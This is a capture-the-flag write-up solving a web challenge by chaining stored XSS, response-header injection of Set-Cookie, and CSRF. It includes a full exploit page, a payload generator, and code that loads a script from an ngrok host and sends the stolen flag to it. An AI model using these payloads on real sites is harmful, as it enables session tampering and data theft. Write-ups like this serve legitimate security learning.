<hr />

<h2>description: Stored XSS and Response Header Injection Leads to CSRF</h2>

<h1>Notepad 1 - Snakehole's Secret</h1>

<h2>Challenge</h2>

<p><strong>Description:</strong> Janet Snakehole, the rich aristocratic widow with a terrible secret, is being investigated by the FBI's number 1, Burt Tyrannosaurus Macklin. Burt found a website that she visits often. See if you can find anything.</p>

<p><strong>Author:</strong> <a href="https://twitter.com/Az3z3l">Az3z3l</a></p>

<h2>Solution</h2>

<h3>Stored XSS</h3>

<p>At first glance, it is very clear that the site was vulnerable to XSS. For instance, adding the note <code>&lt;h1&gt;Test&lt;/h1&gt;</code> results in the heading tags being injected:</p>

<p><img src="../../.gitbook/assets/Screenshot 2021-08-16 at 9.07.57 PM.png" alt="" /></p>

<p>When the page is first loaded, the <code>init()</code> function is called, and the displayed note's innerHTML is changed to the <code>/get</code> response.</p>

<p>Notes are added through a POST request to <code>/add</code>.</p>

<p>``<code>javascript
async function addNote() {
    x=document.getElementById("note-dev").value.trim()
    const response = await fetch("/add", {
        method: 'POST', 
        headers: {
            "Content-Type": "application/x-www-form-urlencoded",
        },
        body:</code>content=${x}`
    });
    z = await (response.text());
    changeNote(x)
}</p>

<p>function changeNote(play){
    let ele = document.getElementById('my-stuff');
    ele.innerHTML = play+"<br />";
    document.getElementById("note-dev").value = ""
}</p>

<p>async function init(){
    const response = await fetch("/get", {
        method: 'GET', 
    });
    z = await (response.text());
    changeNote(z)
}
```</p>

<p>The <code>/get</code> endpoint retrieves notes from the <code>Notes</code> map, based on the user's ID cookie.</p>

<p><code>go
func get(w http.ResponseWriter, r *http.Request) {
    id := getIDFromCooke(r, w)
    x := Notes[id]
    headerSetter(w, cType)
    if x == "" {
        fmt.Fprintf(w, "404 No Note Found")
    } else {
        fmt.Fprintf(w, x)
    }
}
</code></p>

<p>The <code>/add</code> endpoint stores the user's notes, but only if the notes' content is less than 75 characters. In order to create a valid stored XSS payload, we must use a relatively short one.</p>

<p>```go
func add(w http.ResponseWriter, r *http.Request) {</p>

<pre><code>id := getIDFromCooke(r, w)
if id != adminID {
    r.ParseForm()
    noteConte := r.Form.Get("content")
    if len(noteConte) &lt; 75 {
        Notes[id] = noteConte
    }
}
fmt.Fprintf(w, "OK")
</code></pre>

<p>}
```</p>

<p>Note that for all the API endpoints, the following cookies are set to prevent XSS.</p>

<p><code>go
// Prevent XSS on api-endpoints ¬‿¬
var cType = map[string]string{
    "Content-Type":            "text/plain",
    "x-content-type-options":  "nosniff",
    "X-Frame-Options":         "DENY",
    "Content-Security-Policy": "default-src 'none';",
}
</code></p>

<p>Since the notes are fetched based on the user's cookies, we still do not have a way to perform an XSS attack on the admin (we would only be able to do it to ourselves!). </p>

<h3>Response Header Injection</h3>

<p>There is one other API endpoint, though, that we haven't explored. The <code>/find</code> endpoint takes the <code>condition</code>, <code>startsWith</code> , <code>endsWith</code> and <code>debug</code> parameters. The first three are pretty simple - they help to check if the note starts with or ends with a certain substring.</p>

<p>The <code>debug</code> parameter, on the other hand, is quite interesting. If it is set, the 4 parameters above are deleted, and the remaining parameters are looped through. If the key matches the <code>^[a-zA-Z0-9{}_;-]*$</code> regex, and the value is less than 50 characters, then the key-value pair is set as a response header.</p>

<p>```go
func find(w http.ResponseWriter, r *http.Request) {</p>

<pre><code>id := getIDFromCooke(r, w)

param := r.URL.Query()
x := Notes[id]

var which string
str, err := param["condition"]
if !err {
    which = "any"
} else {
    which = str[0]
}

var start bool
str, err = param["startsWith"]
if !err {
    start = strings.HasPrefix(x, "snake")
} else {
    start = strings.HasPrefix(x, str[0])
}
var responseee string
var end bool
str, err = param["endsWith"]
if !err {
    end = strings.HasSuffix(x, "hole")
} else {
    end = strings.HasSuffix(x, str[0])
}

if which == "starts" &amp;&amp; start {
    responseee = x
} else if which == "ends" &amp;&amp; end {
    responseee = x
} else if which == "both" &amp;&amp; (start &amp;&amp; end) {
    responseee = x
} else if which == "any" &amp;&amp; (start || end) {
    responseee = x
} else {
    _, present := param["debug"]
    if present {
        delete(param, "debug")
        delete(param, "startsWith")
        delete(param, "endsWith")
        delete(param, "condition")

        for k, v := range param {
            for _, d := range v {

                if regexp.MustCompile("^[a-zA-Z0-9{}_;-]*$").MatchString(k) &amp;&amp; len(d) &lt; 50 {
                    w.Header().Set(k, d)
                }
                break
            }
            break
        }
    }
    responseee = "404 No Note Found"
}
headerSetter(w, cType)
fmt.Fprintf(w, responseee)
</code></pre>

<p>}
```</p>

<p>Remember how we couldn't get the admin to visit our note previously? Well, now we can! All we have to do is to inject a <code>Set-Cookie</code> header, setting the admin's ID cookie to our own.</p>

<p>But we still need the original admin's ID (otherwise, how do we get the admin's note?). We can get around that quite easily, though - by simply setting the <code>Path</code> of our custom cookie to <code>/get</code>, we can make sure that when the admin visits our main site, our custom <code>id</code> cookie is used (since the longest match "wins"). However, since the admin's original <code>id</code> cookie still exists with the <code>Path</code> set to <code>/</code>, the <code>/find</code> endpoint will still use the original admin ID.</p>

<h3>Crafting Our Payload</h3>

<p><em>On hindsight, this was way more complex than necessary. The intended solution simply used <code>eval(window.name)</code>, since <code>window.name</code> can be set by the attacker when using <code>window.open()</code>. I'll share mine anyway, because it was quite interesting (to me at least).</em></p>

<p>Since we’re in innerHTML, the ideal way is to append a new script element and fetch our external script:</p>

<p><code>var newScript = document.createElement("script");newScript.src = "http://www.example.com/my-script.js";this.appendChild(newScript);</code></p>

<p>But there’s a 75 character limit in order for the XSS payload to be stored. </p>

<p>I ended up using cookies, since <code>document.cookies</code> will return a string like:</p>

<p><code>
cookieA=valueA; cookieB=valueB; ...
</code></p>

<p>This format is very convenient to create JS code which we can <code>eval()</code>. Let the cookie name be <code>var x</code>, and the cookie value be <code>eval(alert())</code>, and we can run valid JavaScript code using <code>eval(document.cookie)</code>:</p>

<p><code>javascript
var x = eval(alert())
</code></p>

<p>Since the header values <em>also</em> have a length limit of 50 characters, we need to set multiple cookies. Essentially, the <code>document.cookies</code> will return the following string (newlines inserted for clarity):</p>

<p>```javascript
var A = "SOME<em>STRING";
var B = A + "SOME</em>STRING";</p>

<p>...</p>

<p>var a = Z + "SOME_STRING";
var b = eval(a)
```</p>

<p>Here's the script to convert the payload to the necessary URLs to set the cookies:</p>

<p>```python
import urllib.parse
import string</p>

<p>PAYLOAD = "var newScript = document.createElement('script');newScript.src = 'http://2e2e80a5f153.ngrok.io/exploit.js';this.appendChild(newScript);"</p>

<p>charcodes = []
for char in PAYLOAD:
    charcodes.append(ord(char))</p>

<p>print(charcodes)</p>

<p>f = open("exploit.html", "w")</p>

<p>chars = string.ascii<em>uppercase + string.ascii</em>lowercase
i = 0</p>

<p>f.write("<script>\n")
while charcodes:
    codes = [str(x) for x in charcodes[:5]]
    charcodes = charcodes[5:]</p>

<pre><code>if i == 0:
    url = urllib.parse.quote(f"var {chars[i]}=String.fromCharCode({','.join(codes)});")

else:
    url = urllib.parse.quote(f"var {chars[i]}={chars[i-1]}+String.fromCharCode({','.join(codes)});")
i += 1

url = "http://chall.notepad1.gq:1111/find?debug&amp;Set-Cookie=" + url

f.write(f"window.open(\"{url}\");\n")
</code></pre>

<p>url = urllib.parse.quote(f"var {chars[i]}=eval({chars[i-1]});")
url = "http://chall.notepad1.gq:1111/find?debug&amp;Set-Cookie=" + url
f.write(f"window.open(\"{url}\");\n")</p>

<p>f.write("</script>")
```</p>

<p>With some modification of the output, the final exploit script is:</p>

<p>```markup</p>

<script>

function wait(time) {
    return new Promise(resolve => {
        setTimeout(() => {
            resolve();
        }, time);
    });
}

(async () => {
    window.open("http://chall.notepad1.gq:1111/find?debug&Set-Cookie=var%20A%3DString.fromCharCode%28118%2C97%2C114%2C32%2C110%29%3B");
    window.open("http://chall.notepad1.gq:1111/find?debug&Set-Cookie=var%20B%3DA%2BString.fromCharCode%28101%2C119%2C83%2C99%2C114%29%3B");
    window.open("http://chall.notepad1.gq:1111/find?debug&Set-Cookie=var%20C%3DB%2BString.fromCharCode%28105%2C112%2C116%2C32%2C61%29%3B");
    window.open("http://chall.notepad1.gq:1111/find?debug&Set-Cookie=var%20D%3DC%2BString.fromCharCode%2832%2C100%2C111%2C99%2C117%29%3B");
    window.open("http://chall.notepad1.gq:1111/find?debug&Set-Cookie=var%20E%3DD%2BString.fromCharCode%28109%2C101%2C110%2C116%2C46%29%3B");
    window.open("http://chall.notepad1.gq:1111/find?debug&Set-Cookie=var%20F%3DE%2BString.fromCharCode%2899%2C114%2C101%2C97%2C116%29%3B");
    window.open("http://chall.notepad1.gq:1111/find?debug&Set-Cookie=var%20G%3DF%2BString.fromCharCode%28101%2C69%2C108%2C101%2C109%29%3B");
    window.open("http://chall.notepad1.gq:1111/find?debug&Set-Cookie=var%20H%3DG%2BString.fromCharCode%28101%2C110%2C116%2C40%2C39%29%3B");
    window.open("http://chall.notepad1.gq:1111/find?debug&Set-Cookie=var%20I%3DH%2BString.fromCharCode%28115%2C99%2C114%2C105%2C112%29%3B");
    window.open("http://chall.notepad1.gq:1111/find?debug&Set-Cookie=var%20J%3DI%2BString.fromCharCode%28116%2C39%2C41%2C59%2C110%29%3B");
    window.open("http://chall.notepad1.gq:1111/find?debug&Set-Cookie=var%20K%3DJ%2BString.fromCharCode%28101%2C119%2C83%2C99%2C114%29%3B");
    window.open("http://chall.notepad1.gq:1111/find?debug&Set-Cookie=var%20L%3DK%2BString.fromCharCode%28105%2C112%2C116%2C46%2C115%29%3B");
    window.open("http://chall.notepad1.gq:1111/find?debug&Set-Cookie=var%20M%3DL%2BString.fromCharCode%28114%2C99%2C32%2C61%2C32%29%3B");
    window.open("http://chall.notepad1.gq:1111/find?debug&Set-Cookie=var%20N%3DM%2BString.fromCharCode%2839%2C104%2C116%2C116%2C112%29%3B");
    window.open("http://chall.notepad1.gq:1111/find?debug&Set-Cookie=var%20O%3DN%2BString.fromCharCode%2858%2C47%2C47%2C50%2C101%29%3B");
    window.open("http://chall.notepad1.gq:1111/find?debug&Set-Cookie=var%20P%3DO%2BString.fromCharCode%2850%2C101%2C56%2C48%2C97%29%3B");
    window.open("http://chall.notepad1.gq:1111/find?debug&Set-Cookie=var%20Q%3DP%2BString.fromCharCode%2853%2C102%2C49%2C53%2C51%29%3B");
    window.open("http://chall.notepad1.gq:1111/find?debug&Set-Cookie=var%20R%3DQ%2BString.fromCharCode%2846%2C110%2C103%2C114%2C111%29%3B");
    window.open("http://chall.notepad1.gq:1111/find?debug&Set-Cookie=var%20S%3DR%2BString.fromCharCode%28107%2C46%2C105%2C111%2C47%29%3B");
    window.open("http://chall.notepad1.gq:1111/find?debug&Set-Cookie=var%20T%3DS%2BString.fromCharCode%28101%2C120%2C112%2C108%2C111%29%3B");
    window.open("http://chall.notepad1.gq:1111/find?debug&Set-Cookie=var%20U%3DT%2BString.fromCharCode%28105%2C116%2C46%2C106%2C115%29%3B");
    window.open("http://chall.notepad1.gq:1111/find?debug&Set-Cookie=var%20V%3DU%2BString.fromCharCode%2839%2C59%2C116%2C104%2C105%29%3B");
    window.open("http://chall.notepad1.gq:1111/find?debug&Set-Cookie=var%20W%3DV%2BString.fromCharCode%28115%2C46%2C97%2C112%2C112%29%3B");
    window.open("http://chall.notepad1.gq:1111/find?debug&Set-Cookie=var%20X%3DW%2BString.fromCharCode%28101%2C110%2C100%2C67%2C104%29%3B");
    window.open("http://chall.notepad1.gq:1111/find?debug&Set-Cookie=var%20Y%3DX%2BString.fromCharCode%28105%2C108%2C100%2C40%2C110%29%3B");
    window.open("http://chall.notepad1.gq:1111/find?debug&Set-Cookie=var%20Z%3DY%2BString.fromCharCode%28101%2C119%2C83%2C99%2C114%29%3B");
    window.open("http://chall.notepad1.gq:1111/find?debug&Set-Cookie=var%20a%3DZ%2BString.fromCharCode%28105%2C112%2C116%2C41%2C59%29%3B");
    window.open("http://chall.notepad1.gq:1111/find?debug&Set-Cookie=var%20b%3Deval%28a%29%3B");

    await wait(1000);
    window.open("http://chall.notepad1.gq:1111/find?debug&Set-Cookie=id=5e732a1878be2342dbfeff5fe3ca5aa3%3B+Path=/get");

    var img = new Image();
    img.src = 'http://2e2e80a5f153.ngrok.io/?data=' + 'Set cookies successfully.';

    await wait(1000);
    window.location.href = "http://chall.notepad1.gq:1111/";
})();
</script>

<p>```</p>

<p>Visiting these URLs set the following cookies. Notice that we have set the <code>id</code> cookie with the <code>/get</code> path, and that the original <code>id</code> with the <code>/</code> path is preserved.</p>

<p><img src="../../.gitbook/assets/image (45).png" alt="" /></p>

<p>After <code>document.cookie.split('; ').sort()</code>, the previously inserted cookies will be in the correct order, starting from <code>var A</code>, and each subsequent variable builds on top of the previous variable.</p>

<p><img src="../../.gitbook/assets/image (46).png" alt="" /></p>

<p><code>var a</code> will end up being the full payload:</p>

<p><img src="../../.gitbook/assets/image (47).png" alt="" /></p>

<p>This is finally eval-ed again (inside the eval) by <code>var b</code>.</p>

<p>The XSS payload is then:</p>

<p><code>markup
&lt;img/src/onerror="eval(document.cookie.split('; ').sort().join(';'))"&gt;
</code></p>

<p>This takes up 70 characters, satisfying the length requirement in order to be stored.</p>

<p><img src="../../.gitbook/assets/image (48).png" alt="" /></p>

<p>Now, we can store this XSS payload! When the admin visits the site, our payload is fetched:</p>

<p><img src="../../.gitbook/assets/image (49).png" alt="" /></p>

<p>The only thing left now is to perform a CSRF to the <code>/find</code> endpoint to get the flag, and make a callback to our exploit server with the data.</p>

<p><code>javascript
fetch('find?startsWith=in')
    .then(function(response) {return response.text();})
    .then(function (text) {
    var img = new Image();
    img.src = 'http://2e2e80a5f153.ngrok.io/?data=' + encodeURIComponent(text);
})
</code></p>

<h3>Pwned</h3>

<p>This took way too long, because I didn't think of the simple <code>window.name</code> payload! </p>

<p><img src="../../.gitbook/assets/image (50).png" alt="" /></p>

<p>Regardless, I was excited to finally the flag, after way more pain than necessary.</p>

<p><code>inctf{youll_never_take_me_alive_ialmvwoawpwe}</code></p>
